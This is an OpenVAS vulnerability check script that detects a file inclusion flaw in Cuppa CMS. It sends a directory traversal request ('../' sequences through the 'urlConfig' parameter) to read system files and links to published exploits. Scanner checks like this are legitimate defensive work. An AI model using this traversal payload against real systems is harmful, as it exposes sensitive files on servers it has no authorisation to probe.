###############################################################################
# OpenVAS Vulnerability Test
#
# Cuppa CMS Remote/Local File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803805");
  script_version("2022-02-14T13:47:12+0000");
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-02-14 13:47:12 +0000 (Mon, 14 Feb 2022)");
  script_tag(name:"creation_date", value:"2013-06-06 10:36:14 +0530 (Thu, 06 Jun 2013)");
  script_name("Cuppa CMS Remote/Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://1337day.com/exploit/20855");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25971");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121881/cuppacms-rfi.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/cuppa-cms-remote-local-file-inclusion");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  or include arbitrary files from the local system using directory traversal
  sequences on the target system.");

  script_tag(name:"affected", value:"Cuppa CMS beta version 0.1");

  script_tag(name:"insight", value:"Improper sanitation of user supplied input via 'urlConfig'
  parameter to 'alerts/alertConfigField.php' script.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Cuppa CMS is prone to a file inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/", "/cuppa", "/cms", http_cgi_dirs(port:port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:port);

  if(rcvRes && ">Cuppa CMS" >< rcvRes && "Username<" >< rcvRes)
  {

    foreach file (keys(files))
    {
      url = dir + "/alerts/alertConfigField.php?urlConfig=" +
                  crap(data:"../",length:3*15) + files[file];

      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        report = http_report_vuln_url( port:port, url:url );
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
